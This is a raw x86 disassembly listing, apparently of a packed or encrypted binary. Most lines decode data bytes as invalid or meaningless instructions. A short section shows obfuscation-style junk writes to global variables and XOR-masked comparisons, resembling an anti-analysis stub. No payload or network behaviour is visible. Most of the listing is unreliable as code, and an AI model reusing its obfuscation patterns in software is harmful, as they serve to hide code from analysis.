  40acf4:	fmul   QWORD PTR [esi]
  40acf6:	in     eax,dx
  40acf7:	lods   eax,DWORD PTR ds:[esi]
  40acf8:	test   ebp,0xf6e7cfab
  40acfe:	(bad)  
  40ad00:	retf   
  40ad01:	retf   
  40ad02:	(bad)  
  40ad04:	xlat   BYTE PTR ds:[ebx]
  40ad05:	mov    esi,0xeed0b9d8
  40ad0a:	stc    
  40ad0b:	fmul   QWORD PTR [ebx]
  40ad0d:	jecxz  0x40acee
  40ad0f:	rcr    dh,0xc8
  40ad12:	(bad)  
  40ad13:	jmp    0x40ad0d
  40ad15:	shr    eax,cl
  40ad17:	test   eax,0xb2f2efe1
  40ad1c:	(bad)  
  40ad1d:	enter  0xd2bb,0xed
  40ad21:	mov    esi,0xe3eae3db
  40ad26:	clc    
  40ad27:	sti    
  40ad28:	repnz fld QWORD PTR [ebx+ecx*1]
  40ad2c:	push   es
  40ad2d:	std    
  40ad2e:	or     ch,al
  40ad30:	(bad)
  40ad33:	add    al,0xe7
  40ad35:	clc    
  40ad36:	call   0xd310a50c
  40ad3b:	jmp    0xccf7:0xc7fad0f0
  40ad42:	iret   
  40ad43:	fidiv  DWORD PTR [esp+ecx*8-0x22230eff]
  40ad4a:	fiadd  DWORD PTR [ebx]
  40ad4c:	aam    0xfa
  40ad4e:	in     eax,0xc1
  40ad50:	in     al,0xf4
  40ad52:	or     eax,0xbde4ccdd
  40ad57:	fadd   st(6),st
  40ad59:	fimul  WORD PTR [ebx-0x9ccf7b3]
  40ad5f:	mov    eax,ds:0x43772f
  40ad64:	add    DWORD PTR ds:0x437767,eax
  40ad6a:	sub    ecx,0x5424137
  40ad70:	inc    eax
  40ad71:	sbb    esi,0x0
  40ad74:	xor    eax,DWORD PTR ds:0x43771b
  40ad7a:	xor    ecx,0x8a29a14b
  40ad80:	adc    eax,DWORD PTR ds:0x43775f
  40ad86:	xor    esi,0x0
  40ad89:	mov    DWORD PTR ds:0x437773,0x7e2
  40ad93:	mov    eax,ds:0x43739f
  40ad98:	mov    eax,DWORD PTR [eax+0x1c8]
  40ad9e:	add    DWORD PTR ds:0x437737,0x43770f
  40ada8:	mov    eax,DWORD PTR [eax]
  40adaa:	sub    DWORD PTR ds:0x437723,0xba8
  40adb4:	cdq    
  40adb5:	or     DWORD PTR ds:0x43771b,0x437747
  40adbf:	sub    eax,0x5424137
  40adc4:	sbb    edx,0x0
  40adc7:	xor    eax,0x8a29a14b
  40adcc:	sub    DWORD PTR ds:0x43772f,0x4df4
  40add6:	xor    edx,0x0
  40add9:	mov    DWORD PTR [ebp-0x2c],ecx
  40addc:	mov    DWORD PTR ds:0x43772f,0x73f6
  40ade6:	mov    DWORD PTR [ebp-0x28],esi
  40ade9:	mov    DWORD PTR ds:0x43772f,0xee1
  40adf3:	mov    DWORD PTR [ebp-0x34],eax
  40adf6:	mov    DWORD PTR ds:0x43772f,0x1b8
  40ae00:	mov    DWORD PTR [ebp-0x30],edx
  40ae03:	mov    DWORD PTR ds:0x43777f,0x1aab
  40ae0d:	mov    eax,DWORD PTR [ebp-0x2c]
  40ae10:	cmp    eax,DWORD PTR [ebp-0x34]
  40ae13:	mov    DWORD PTR ds:0x43777b,0xd67
  40ae1d:	jne    0x40ae34
  40ae23:	mov    eax,0x7348
  40ae28:	mov    eax,DWORD PTR [ebp-0x28]
  40ae2b:	cmp    eax,DWORD PTR [ebp-0x30]
  40ae2e:	je     0x40ae56
  40ae34:	and    DWORD PTR ds:0x43775b,0x1a29
  40ae3e:	mov    eax,DWORD PTR [ebp+0x8]
  40ae41:	add    eax,DWORD PTR [ebp+0xc]
  40ae44:	mov    DWORD PTR ds:0x437753,0x47ad
  40ae4e:	mov    DWORD PTR [ebp+0x8],eax
  40ae51:	jmp    0x40d295
  40ae56:	and    DWORD PTR ds:0x43777f,0x0
  40ae60:	jmp    0x40ae73
  40ae65:	xor    eax,eax
  40ae67:	xor    eax,DWORD PTR ds:0x43777f
  40ae6d:	inc    eax
  40ae6e:	mov    ds:0x43777f,eax
  40ae73:	cmp    DWORD PTR ds:0x43777f,0x17
  40ae7a:	jae    0x40aebd
  40ae80:	cmp    DWORD PTR ds:0x43777f,0x4
  40ae87:	ja     0x40aebd
  40ae8d:	jmp    0x40ae9d
  40ae92:	push   0x75c8
  40ae97:	call   DWORD PTR ds:0x43c998
  40ae9d:	cmp    DWORD PTR ds:0x43777f,0x3
  40aea4:	jne    0x40aeb8
  40aeaa:	xor    eax,eax
  40aeac:	xor    eax,DWORD PTR ds:0x43777f
  40aeb2:	inc    eax
  40aeb3:	mov    ds:0x43777f,eax
  40aeb8:	jmp    0x40ae65
  40aebd:	mov    eax,DWORD PTR [ebp-0x8]
  40aec0:	mov    eax,DWORD PTR [eax]
  40aec2:	xor    ecx,ecx
  40aec4:	sub    eax,0x5424137
  40aec9:	sbb    ecx,0x0
  40aecc:	xor    eax,0x8a29a14b
  40aed1:	xor    ecx,0x0
  40aed4:	xor    eax,0x8a29a14b
  40aed9:	xor    ecx,0x0
  40aedc:	jmp    0x40d22a
  40aee1:	adc    DWORD PTR [edi+0x72f722e7],0x46
  40aee8:	ss hlt 
  40aeea:	icebp  
  40aeeb:	xchg   DWORD PTR [ecx+edi*8+0x3ff2214c],eax
  40aef2:	pop    es
  40aef3:	jnp    0x40af70
  40aef5:	stos   BYTE PTR es:[edi],al
  40aef6:	cwde   
  40aef7:	jnp    0x40af74
  40aef9:	stos   DWORD PTR es:[edi],eax
  40aefa:	out    dx,eax
  40aefb:	repnz mov ch,0xe7
  40aefe:	mov    al,0xcb
  40af00:	clc    
  40af01:	mov    bl,0xbe
  40af03:	jmp    0xf93e90e4
  40af08:	icebp  
  40af09:	std    
  40af0a:	neg    bh
  40af0c:	jmp    0x10e:0xee1ebd6
  40af13:	fcomp  st(7)
  40af15:	icebp  
  40af16:	call   0xee387b0b
  40af1b:	ret    
  40af1c:	mov    al,0xb0
  40af1e:	int    0xd2
  40af20:	fidivr WORD PTR [edx-0x46002714]
  40af26:	pop    es
  40af27:	neg    edx
  40af29:	fdiv   st,st(4)
  40af2b:	out    0xd5,eax
  40af2d:	rol    ebp,0xeb
  40af30:	cmc    
  40af31:	jecxz  0x40aeff
  40af33:	stc    
  40af34:	leave  
  40af35:	fucomip st,st(6)
  40af37:	div    BYTE PTR [edi-0x4a1b1819]
  40af3d:	mov    edx,0xbfe8dfd5
  40af42:	rcl    bl,cl
  40af44:	mov    esi,0x7ccddb8
  40af49:	(bad)  
  40af4a:	or     ebx,ebx
  40af4c:	add    eax,0xc5e9ffc7
  40af51:	retf   0xe9dc
  40af54:	cli    
  40af55:	int3   
  40af56:	jmp    0x40af18
  40af58:	mov    bh,0xc5
  40af5a:	stos   BYTE PTR es:[edi],al
  40af5b:	rcl    dl,cl
  40af5d:	aad    0xf3
  40af5f:	repnz fcmove st,st(5)
  40af62:	mov    edx,0xc0dc01d4
  40af67:	cli    
  40af68:	lock fcmovu st,st(5)
  40af6b:	cmc    
  40af6c:	jmp    0xd63cbb32
  40af71:	fsubr  st,st(1)
  40af73:	sar    edi,0xae
  40af76:	jecxz  0x40af62
  40af78:	out    0xb2,eax
  40af7a:	in     al,dx
  40af7b:	loope  0x40af68
  40af7d:	mov    ch,0xd8
  40af7f:	call   0xee1d6830
  40af84:	sti    
  40af85:	ror    ah,1
  40af87:	(bad)  
  40af88:	cld    
  40af89:	ror    BYTE PTR [ebx],cl
  40af8b:	out    0x4,eax
  40af8d:	or     dl,ah
  40af8f:	rol    DWORD PTR [edx],0xcb
  40af92:	fild   WORD PTR [eax]
  40af94:	bswap  ebx
  40af96:	scas   al,BYTE PTR es:[edi]
  40af97:	(bad)  
  40af98:	test   al,0xeb
  40af9a:	(bad)  
  40af9b:	mov    bl,0xc7
  40af9d:	not    edx
  40af9f:	hlt    
  40afa0:	mov    dh,0xf3
  40afa2:	lock ret 
  40afa4:	mov    eax,0xdfd8cfec
  40afa9:	shl    ebp,1
  40afab:	(bad)  
  40afac:	ffree  st(7)
  40afae:	jmp    0x40afb2
  40afb0:	retf   
  40afb1:	(bad)  
  40afb2:	or     edx,esi
  40afb4:	or     al,bl
  40afb6:	mov    ebp,0xb3bdb7a8
  40afbb:	in     eax,0xd5
  40afbd:	in     eax,0xb2
  40afbf:	(bad)
  40afc2:	stc    
  40afc3:	(bad)  
  40afc5:	mov    ebp,0xe0eeed07
  40afca:	in     eax,0xd3
  40afcc:	mul    edx
  40afce:	out    0xdc,al
  40afd0:	retf   
  40afd1:	loope  0x40afb6
  40afd3:	out    0xf2,eax
  40afd5:	jmp    0x40afa4
  40afd7:	retf   
  40afd8:	mov    cl,0xcb
  40afda:	int    0xc7
  40afdc:	mov    ch,0xef
  40afde:	call   0xc5096a9a
  40afe3:	fdivr  DWORD PTR [ebp-0x214a4303]
  40afe9:	fcmovb st,st(2)
  40afeb:	(bad)
  40afee:	(bad)  
  40afef:	clc    
  40aff0:	leave  
  40aff1:	hlt    
  40aff2:	mov    BYTE PTR [edi],0xc9
  40aff5:	out    dx,eax
  40aff6:	shr    DWORD PTR [esi-0x2e041b52],cl
  40affc:	in     al,0xfa
  40affe:	jmp    0x40afeb
  40b000:	repz mov bh,0xce
  40b003:	lock mov ebp,0xf4fdd3b9
  40b009:	lock (bad) 
  40b00b:	clc    
  40b00c:	add    al,0xc6
  40b00e:	fdivp  st(7),st
  40b010:	(bad)  
  40b011:	call   0xc02aa00f
  40b016:	in     al,dx
  40b017:	call   0xd7ee92e3
  40b01c:	in     eax,dx
  40b01d:	mov    ah,0xb2
  40b01f:	aam    0xc8
  40b021:	mov    bh,0xd2
  40b023:	aad    0xdb
  40b025:	std    
  40b026:	(bad)  
  40b027:	repz in eax,0xe4
  40b02a:	in     al,0xfe
  40b02c:	add    ah,al
  40b02e:	retf   
  40b02f:	loopne 0x40b00c
  40b031:	enter  0x2c4,0x3
  40b035:	loopne 0x40b017
  40b037:	jmp    0xe40e811f
  40b03c:	mov    dl,0xfa
  40b03e:	cli    
  40b03f:	iret   
  40b040:	iret   
  40b041:	call   0xe918b330
  40b046:	sti    
  40b047:	out    dx,al
  40b048:	out    0xbd,al
  40b04a:	int3   
  40b04b:	lock add eax,0xdbe604ea
  40b051:	std    
  40b052:	jmp    0xeaee:0xe5e502cd
  40b059:	int    0xd5
  40b05b:	mov    ah,0xe2
  40b05d:	iret   
  40b05e:	(bad)  
  40b05f:	stc    
  40b060:	in     al,0xe5
  40b062:	mov    eax,0xf7c9f5f7
  40b067:	(bad)  
  40b068:	jecxz  0x40b062
  40b06a:	cmc    
  40b06b:	rol    BYTE PTR [edi],0xf7
  40b06e:	enter  0xdeea,0xc4
  40b072:	repz or BYTE PTR ds:0xe8b7e3d2,al
  40b079:	test   ecx,0xd3e1fac1
  40b07f:	shr    edi,1
  40b081:	into   
  40b082:	fcmovbe st,st(3)
  40b084:	repnz std 
  40b086:	add    esi,DWORD PTR [ebp-0x2e051d06]
  40b08c:	aad    0xf7
  40b08e:	call   0xe24e9d9a
  40b093:	or     eax,esp
  40b095:	mov    edi,0xadc5f2c3
  40b09a:	shr    DWORD PTR [ebp+edx*8-0x104f0a2e],cl
  40b0a1:	aad    0xcd
  40b0a3:	mov    ch,0xf3
  40b0a5:	shr    al,cl
  40b0a7:	(bad)  
  40b0a8:	cld    
  40b0a9:	rcr    esp,1
  40b0ab:	faddp  st(3),st
  40b0ad:	out    0xfd,eax
  40b0af:	cli    
  40b0b0:	into   
  40b0b1:	(bad)  
  40b0b2:	or     al,0xc9
  40b0b4:	or     cl,dl
  40b0b6:	lds    esi,FWORD PTR [ebx-0x520f2923]
  40b0bc:	jmp    0xb5267172
  40b0c1:	out    dx,al
  40b0c2:	jecxz  0x40b09f
  40b0c4:	mov    esi,0xecdc07b7
  40b0c9:	(bad)  
  40b0ca:	aad    0xcb
  40b0cc:	jmp    0x40b0d0
  40b0ce:	hlt    
  40b0cf:	les    eax,FWORD PTR [ecx*1-0x2c10f425]
  40b0d6:	mov    esi,0xdcade3bd
  40b0db:	aam    0xea
  40b0dd:	mov    ch,0xf5
  40b0df:	fidivr WORD PTR [edx-0x164a4312]
  40b0e5:	leave  
  40b0e6:	fdivp  st(0),st
  40b0e8:	int3   
  40b0e9:	rcr    ecx,1
  40b0eb:	add    ch,ah
  40b0ed:	call   0xfe0a96d6
  40b0f2:	in     eax,0x12
  40b0f4:	fidiv  DWORD PTR [ebx-0x2c433124]
  40b0fa:	mov    ah,0xca
  40b0fc:	loopne 0x40b0f6
  40b0fe:	out    dx,eax
  40b0ff:	call   0xf224acca
  40b104:	iret   
  40b105:	leave  
  40b106:	jecxz  0x40b0d6
  40b108:	out    dx,al
  40b109:	mul    dh
  40b10b:	(bad)  
  40b10c:	loopne 0x40b0d3
  40b10e:	les    ecx,FWORD PTR [edx]
  40b110:	in     al,0xe5
  40b112:	push   cs
  40b113:	repnz stc 
  40b115:	out    0xea,al
  40b117:	mov    bl,0xe9
  40b119:	(bad)  
  40b11b:	call   0xe0176cfb
  40b120:	mov    esi,0xb0ddc8d4
  40b125:	xlat   BYTE PTR ds:[ebx]
  40b126:	clc    
  40b127:	rcl    dl,cl
  40b129:	out    0xd1,eax
  40b12b:	fcmovbe st,st(6)
  40b12d:	sti    
  40b12e:	std    
  40b12f:	sar    ah,0xfc
  40b132:	or     eax,0xefee01cb
  40b137:	call   0xb5f3a531
  40b13c:	neg    bl
  40b13e:	icebp  
  40b13f:	in     eax,0xcb
  40b141:	in     eax,0xf5
  40b143:	fnstenv [ecx+ebx*8-0x4443192a]
  40b14a:	cld    
  40b14b:	fcmovu st,st(0)
  40b14d:	or     al,cl
  40b14f:	or     DWORD PTR [ecx],eax
  40b151:	into   
  40b152:	fcmovb st,st(4)
  40b154:	out    dx,eax
  40b155:	out    dx,eax
  40b156:	fmul   st(4),st
  40b158:	(bad)
  40b15c:	(bad)  
  40b15d:	(bad)  
  40b15f:	out    dx,eax
  40b160:	fdivr  DWORD PTR [edx-0x23152d26]
  40b166:	rol    ebx,cl
  40b168:	shl    ah,cl
  40b16a:	(bad)  
  40b16b:	in     al,0xc0
  40b16d:	fcmovu st,st(4)
  40b16f:	push   es
  40b170:	fabs   
  40b172:	in     eax,0xf9
  40b174:	or     al,0xf3
  40b176:	out    dx,eax
  40b177:	lods   eax,DWORD PTR ds:[esi]
  40b178:	(bad)  
  40b179:	stos   DWORD PTR es:[edi],eax
  40b17a:	out    dx,al
  40b17b:	repz loopne 0x40b16f
  40b17e:	hlt    
  40b17f:	hlt    
  40b180:	lock dec bl
  40b183:	int    0xcf
  40b185:	aam    0xf0
  40b187:	fstp   st(0)
  40b189:	fsub   st(3),st
  40b18b:	aam    0xc2
  40b18d:	lock fdiv st(2),st
  40b190:	(bad)  
  40b191:	retf   
  40b192:	add    bl,bl
  40b194:	in     al,0xec
  40b196:	icebp  
  40b197:	mov    al,0xdd
  40b199:	mov    al,0xae
  40b19b:	(bad)  
  40b19c:	loopne 0x40b165
  40b19e:	out    dx,eax
  40b19f:	idiv   BYTE PTR [edi-0x27fc4b22]
  40b1a5:	mov    edx,0xcddefbd9
  40b1aa:	fstp   st(1)
  40b1ac:	fld    QWORD PTR ds:0x30efdf4
  40b1b2:	clc    
  40b1b3:	adc    ch,dh
  40b1b5:	int3   
  40b1b6:	mov    ebp,0xf6ebe2c0
  40b1bb:	mov    bl,0xe2
  40b1bd:	enter  0xe4ce,0xce
  40b1c1:	cld    
  40b1c2:	idiv   BYTE PTR [ebx-0x321e4728]
  40b1c8:	div    al
  40b1ca:	loope  0x40b1c2
  40b1cc:	add    al,0xd9
  40b1ce:	fiadd  DWORD PTR [eax]
  40b1d0:	retf   
  40b1d1:	add    ah,al
  40b1d3:	rcr    ebp,cl
  40b1d5:	test   al,0xe9
  40b1d7:	shr    esi,0xef
  40b1da:	ror    ecx,0xef
  40b1dd:	mov    bl,0xe0
  40b1df:	in     eax,dx
  40b1e0:	iret   
  40b1e1:	int3   
  40b1e2:	mov    edi,0xec03e9cc
  40b1e7:	loop   0x40b1a9
  40b1e9:	rol    BYTE PTR [esi],1
  40b1eb:	cld    
  40b1ec:	push   es
  40b1ed:	add    DWORD PTR [edx],eax
  40b1ef:	loop   0x40b1f2
  40b1f1:	add    eax,DWORD PTR [eax]
  40b1f3:	in     al,dx
  40b1f4:	(bad)  
  40b1f5:	fucom  st(7)
  40b1f7:	repz scas al,BYTE PTR es:[edi]
  40b1f9:	(bad)  
  40b1fa:	hlt    
  40b1fb:	lods   al,BYTE PTR ds:[esi]
  40b1fc:	(bad)  
  40b1fd:	jmp    0x40b1f6
  40b1ff:	mov    cl,0xef
  40b201:	in     eax,dx
  40b202:	cmc    
  40b203:	mov    ebx,0xb8ecbd
  40b208:	rcl    bh,1
  40b20a:	mov    edx,0xe700cbb9
  40b20f:	cld    
  40b210:	clts   
  40b212:	push   cs
  40b213:	les    ecx,FWORD PTR [ebx]
  40b215:	repz xlat BYTE PTR ds:[ebx]
  40b217:	in     eax,0xd0
  40b219:	call   0xb515a3d3
  40b21e:	(bad)
  40b221:	(bad)  
  40b223:	std    
  40b224:	leave  
  40b225:	lock (bad) 
  40b228:	add    DWORD PTR [esi+0xaf2c0e5],edi
  40b22e:	loope  0x40b20c
  40b230:	add    DWORD PTR [edx+edi*8],ecx
  40b233:	lds    ecx,FWORD PTR [esp+ebx*8]
  40b236:	stos   BYTE PTR es:[edi],al
  40b237:	(bad)  
  40b238:	iret   
  40b239:	mov    bl,0xf6
  40b23b:	(bad)  
  40b23c:	iret   
  40b23d:	mov    bh,0xd9
  40b23f:	jmp    0xd638833e
  40b244:	fcmovnu st,st(0)
  40b246:	fdivr  DWORD PTR [edi-0x200d0b14]
  40b24c:	in     eax,0xf5
  40b24e:	fisttp QWORD PTR [esi]
  40b250:	or     eax,0x12f2facb
  40b255:	lods   eax,DWORD PTR ds:[esi]
  40b256:	icebp  
  40b257:	mov    bh,0xe7
  40b259:	fadd   st(4),st
  40b25b:	out    dx,eax
  40b25c:	repz les edi,FWORD PTR [ebx-0x5482919]
  40b263:	sti    
  40b264:	iret   
  40b265:	cli    
  40b266:	(bad)  
  40b268:	cli    
  40b269:	stc    
  40b26a:	sti    
  40b26b:	out    0xd1,al
  40b26d:	(bad)  
  40b26e:	(bad)  
  40b26f:	retf   
  40b270:	out    0xe,al
  40b272:	pop    es
  40b273:	clc    
  40b274:	fmul   st,st(5)
  40b276:	call   0xe6067932
  40b27b:	mov    ebx,0xf6d5edd1
  40b280:	int    0xbd
  40b282:	enter  0xccef,0xd4
  40b286:	enter  0xf4f2,0xdb
  40b28a:	aad    0x6
  40b28c:	or     eax,esi
  40b28e:	rol    esi,0xfd
  40b291:	hlt    
  40b292:	jmp    0xe5087777
  40b297:	shr    bl,1
  40b299:	in     al,dx
  40b29a:	sar    ebx,0xca
  40b29d:	fcmovnu st,st(7)
  40b29f:	inc    dh
  40b2a1:	idiv   BYTE PTR [eax-0x311c3201]
  40b2a7:	mov    ecx,0xe1e7f307
  40b2ac:	pop    es
  40b2ad:	(bad)  
  40b2ae:	inc    BYTE PTR [ecx]
  40b2b0:	add    al,0xe5
  40b2b2:	fcmovne st,st(1)
  40b2b4:	fcomp  st(0)
  40b2b6:	lods   eax,DWORD PTR ds:[esi]
  40b2b7:	out    dx,eax
  40b2b8:	ror    bh,1
  40b2ba:	int    0xdb
  40b2bc:	fcmovnbe st,st(4)
  40b2be:	fidivr DWORD PTR [ecx-0x3632480b]
  40b2c4:	icebp  
  40b2c5:	in     al,dx
  40b2c6:	add    esi,DWORD PTR [ebp-0x14142af9]
  40b2cc:	rol    BYTE PTR [eax],0xe4
  40b2cf:	fisttp DWORD PTR [edi]
  40b2d1:	std    
  40b2d2:	out    dx,al
  40b2d3:	or     dh,cl
  40b2d5:	in     eax,0xf1
  40b2d7:	in     eax,0xd3
  40b2d9:	jecxz  0x40b2a9
  40b2db:	jmp    0xfbb5:0xdeffeed6
  40b2e2:	mov    eax,0xb9dbf6cb
  40b2e7:	sti    
  40b2e8:	repz xlat BYTE PTR ds:[ebx]
  40b2ea:	mov    dl,0xf8
  40b2ed:	pop    es
  40b2ee:	add    al,0x2
  40b2f0:	aam    0xfd
  40b2f2:	out    0xf,eax
  40b2f4:	in     eax,dx
  40b2f5:	(bad)  
  40b2f6:	shl    dh,cl
  40b2f8:	lods   al,BYTE PTR ds:[esi]
  40b2f9:	out    0xb1,eax
  40b2fb:	int3   
  40b2fc:	mov    bl,0xe5
  40b2fe:	mov    dh,0xea
  40b300:	jmp    0x40b2ba
  40b302:	sar    bh,1
  40b304:	mul    cl
  40b306:	mov    ecx,0xd3bbd5bf
  40b30b:	add    eax,0xd800c5f7
  40b310:	in     eax,dx
  40b311:	add    eax,0xbc020aeb
  40b316:	scas   eax,DWORD PTR es:[edi]
  40b317:	scas   al,BYTE PTR es:[edi]
  40b318:	mov    bh,0xcf
  40b31a:	loop   0x40b311
  40b31c:	repnz aam 0xf8
  40b31f:	cli    
  40b320:	aad    0xf8
  40b322:	fstp   TBYTE PTR [edi-0x282e3646]
  40b328:	push   es
  40b329:	aad    0xe6
  40b32b:	(bad)  
  40b32c:	(bad)  
  40b32d:	inc    DWORD PTR [eax]
  40b32f:	xlat   BYTE PTR ds:[ebx]
  40b330:	imul   cl
  40b332:	call   0xb02fba4a
  40b337:	int    0xf3
  40b339:	enter  0xcae4,0xf9
  40b33d:	leave  
  40b33e:	jmp    FWORD PTR [ebp-0x10222c14]
  40b344:	out    dx,eax
  40b345:	xlat   BYTE PTR ds:[ebx]
  40b346:	stc    
  40b347:	in     eax,dx
  40b348:	std    
  40b349:	icebp  
  40b34a:	mov    edx,0xc9fe00fe
  40b34f:	dec    BYTE PTR ds:0xe3fe06cb
  40b355:	in     eax,dx
  40b356:	fdiv   DWORD PTR [eax-0x1d55280a]
  40b35c:	jmp    0xebfc9c5a
  40b361:	mov    ebp,0xb8c9bfea
  40b366:	aam    0xe0
  40b368:	clc    
  40b369:	out    0xf4,eax
  40b36b:	add    eax,edi
  40b36d:	ror    DWORD PTR [eax],0xfc
  40b370:	fcomp  st(5)
  40b372:	in     al,0x13
  40b374:	rcr    bh,cl
  40b376:	ffreep st(3)
  40b378:	scas   eax,DWORD PTR es:[edi]
  40b379:	ret    0xf3b0
  40b37c:	sti    
  40b37d:	lock in al,dx
  40b37f:	in     al,0xf1
  40b381:	mov    ecx,0xe103b8fc
  40b386:	mov    edi,0xbcffbeed
  40b38b:	fadd   st,st(2)
  40b38d:	or     ebx,esp
  40b38f:	out    0xea,eax
  40b391:	aam    0xf9
  40b393:	or     bh,bh
  40b395:	ror    ah,1
  40b397:	retf   
  40b398:	icebp  
  40b399:	stos   DWORD PTR es:[edi],eax
  40b39a:	fdiv   QWORD PTR [ebp+ecx*8-0x482b2533]
  40b3a1:	into   
  40b3a2:	aam    0xcf
  40b3a4:	int3   
  40b3a5:	mov    esi,0xffb4e2b9
  40b3aa:	push   es
  40b3ab:	(bad)  
  40b3ac:	(bad)  
  40b3ad:	dec    DWORD PTR [ebx]
  40b3af:	fild   DWORD PTR [esi]
  40b3b1:	out    dx,al
  40b3b2:	ret    0xe5cb
  40b3b5:	mov    dl,0xe2
  40b3b7:	int3   
  40b3b8:	xlat   BYTE PTR ds:[ebx]
  40b3b9:	shl    DWORD PTR [esi-0x82a0b0b],1
  40b3bf:	in     eax,0xe6
  40b3c1:	clc    
  40b3c2:	jmp    0x40b380
  40b3c4:	ret    0xbdf4
  40b3c7:	in     al,dx
  40b3c8:	add    eax,0xc1f0d901
  40b3cd:	add    eax,0xde0905de
  40b3d2:	out    dx,al
  40b3d3:	loope  0x40b3cd
  40b3d5:	in     al,dx
  40b3d6:	out    0xe5,eax
  40b3d8:	fdivr  st(6),st
  40b3da:	mov    ch,0xb3
  40b3dc:	cmc    
  40b3dd:	mov    cl,0xb0
  40b3df:	rcl    al,1
  40b3e1:	fstp   TBYTE PTR [ecx-0xf472a31]
  40b3e7:	loopne 0x40b3ea
  40b3e9:	rcr    ecx,cl
  40b3eb:	sar    eax,cl
  40b3ed:	stc    
  40b3ee:	(bad)  
  40b3ef:	(bad)  
  40b3f0:	loopne 0x40b3f4
  40b3f2:	or     eax,0xd0d808ea
  40b3f7:	out    0xe1,eax
  40b3f9:	stos   DWORD PTR es:[edi],eax
  40b3fa:	fadd   st(4),st
  40b3fc:	shl    dl,0xf5
  40b3ff:	retf   
  40b400:	int3   
  40b401:	jmp    0x40b3dc
  40b403:	jmp    0x4fb:0x7c3fcf8
  40b40a:	fdivrp st(2),st
  40b40c:	fucomip st,st(0)
  40b40e:	loop   0x40b418
  40b410:	loopne 0x40b3f5
  40b412:	pop    es
  40b413:	add    eax,0xc7b1e1df
  40b418:	mov    dl,0xd1
  40b41a:	out    0xad,eax
  40b41c:	sar    al,1
  40b41e:	mov    cl,0xf2
  40b420:	(bad)  
  40b421:	(bad)  
  40b423:	imul   al
  40b425:	in     eax,dx
  40b426:	stc    
  40b427:	out    dx,al
  40b428:	(bad)  
  40b429:	sar    dh,1
  40b42b:	jmp    0x40b41f
  40b42d:	jmp    0x12fc:0xc9e5eaca
  40b434:	repnz test al,0xad
  40b437:	mov    dl,0xbc
  40b439:	out    0xc3,eax
  40b43b:	xlat   BYTE PTR ds:[ebx]
  40b43c:	shl    BYTE PTR [esi-0x3210b13],1
  40b442:	mov    ebx,0xbebafded
  40b447:	add    cl,al
  40b449:	add    ecx,esp
  40b44b:	ret    0xc9d7
  40b44e:	sti    
  40b44f:	fscale 
  40b451:	out    0x3,eax
  40b453:	fadd   QWORD PTR ds:0xa8c7d0ce
  40b459:	aad    0xdb
  40b45b:	mov    al,0xfb
  40b45d:	rcl    edi,0xe5
  40b460:	(bad)
  40b464:	mov    esi,0xf6d1cee9
  40b469:	(bad)  
  40b46a:	hlt    
  40b46b:	cmc    
  40b46c:	(bad)  
  40b46d:	cli    
  40b46e:	add    eax,DWORD PTR [ebx]
  40b470:	out    dx,eax
  40b471:	(bad)  
  40b472:	fsubr  st(5),st
  40b474:	adc    bl,bh
  40b476:	in     eax,0xdc
  40b478:	shr    BYTE PTR [edi-0x382f393a],cl
  40b47e:	call   0xcd139e62
  40b483:	fadd   DWORD PTR [ebx]
  40b485:	jmp    0xc41f8c78
  40b48a:	ffree  st(6)
  40b48c:	cli    
  40b48d:	aad    0x5
  40b48f:	iret   
  40b490:	fld    QWORD PTR [esi]
  40b492:	or     eax,0xb3bfe6d8
  40b497:	ret    0xbce3
  40b49a:	stos   BYTE PTR es:[edi],al
  40b49b:	in     al,0xf4
  40b49d:	out    dx,eax
  40b49e:	mov    al,0xd8
  40b4a0:	retf   0xd4d5
  40b4a3:	sar    DWORD PTR [ebp-0x3c380a01],cl
  40b4a9:	xlat   BYTE PTR ds:[ebx]
  40b4aa:	fiadd  DWORD PTR [ecx]
  40b4ac:	rol    DWORD PTR [ecx],1
  40b4ae:	psubusw mm5,mm0
  40b4b1:	add    eax,0xeffad3ff
  40b4b6:	test   al,0xb7
  40b4b8:	rcl    esi,1
  40b4ba:	in     eax,dx
  40b4bb:	mov    edx,0xcde8f7f8
  40b4c1:	retf   0xf7db
  40b4c4:	aam    0xf0
  40b4c6:	shl    dh,cl
  40b4c8:	fadd   DWORD PTR ds:0xe500f7fb
  40b4ce:	in     al,0xfa
  40b4d0:	loope  0x40b4dc
  40b4d2:	fcmovne st,st(1)
  40b4d4:	jecxz  0x40b4ae
  40b4d6:	(bad)  
  40b4d7:	xlat   BYTE PTR ds:[ebx]
  40b4d8:	repnz ror dl,1
  40b4db:	retf   
  40b4dc:	(bad)  
  40b4dd:	in     eax,dx
  40b4de:	(bad)  
  40b4df:	cmc    
  40b4e0:	out    dx,eax
  40b4e1:	xlat   BYTE PTR ds:[ebx]
  40b4e2:	clc    
  40b4e3:	add    ebx,edi
  40b4e5:	shl    al,1
  40b4e7:	clc    
  40b4e8:	xlat   BYTE PTR ds:[ebx]
  40b4e9:	add    edx,edx
  40b4eb:	(bad)  
  40b4ec:	repnz neg edx
  40b4ef:	mov    ebp,0xc5fde70e
  40b4f4:	add    esp,esp
  40b4f6:	lods   al,BYTE PTR ds:[esi]
  40b4f7:	test   al,0xe7
  40b4f9:	enter  0xb4b3,0xe2
  40b4fd:	(bad)  
  40b4fe:	out    dx,eax
  40b4ff:	shr    bl,cl
  40b501:	out    dx,eax
  40b502:	clc    
  40b503:	loop   0x40b4de
  40b505:	mov    ebp,0xccd9e0de
  40b50a:	rol    BYTE PTR [ebx],1
  40b50c:	jecxz  0x40b4eb
  40b50e:	add    DWORD PTR [eax],ecx
  40b510:	(bad)  
  40b512:	loop   0x40b4e7
  40b514:	add    bh,BYTE PTR [edi-0x233f3f48]
  40b51a:	call   0xcf1388e8
  40b51f:	mov    eax,0xb8deedb0
  40b524:	enter  0xbcfc,0xcf
  40b528:	sar    dl,1
  40b52a:	mov    esi,0xf9d8d0ea
  40b52f:	std    
  40b530:	aad    0xff
  40b532:	or     cl,bh
  40b534:	rcr    edi,cl
  40b536:	scas   eax,DWORD PTR es:[edi]
  40b537:	shr    bh,cl
  40b539:	scas   eax,DWORD PTR es:[edi]
  40b53a:	leave  
  40b53b:	int    0xd6
  40b53d:	div    ebp
  40b53f:	sti    
  40b540:	retf   0xefd1
  40b543:	mov    edx,0xc103b8c9
  40b548:	fsubr  st(2),st
  40b54a:	(bad)  
  40b54c:	add    al,0xfd
  40b54e:	fdiv   st(5),st
  40b550:	loope  0x40b555
  40b552:	in     al,0xf8
  40b554:	fcomip st,st(3)
  40b556:	jmp    0xd6c5:0xb6b1b2b3
  40b55d:	mov    al,0xc9
  40b55f:	int3   
  40b560:	(bad)  
  40b561:	call   0xc414715d
  40b566:	mov    esp,0xc5f2e6d1
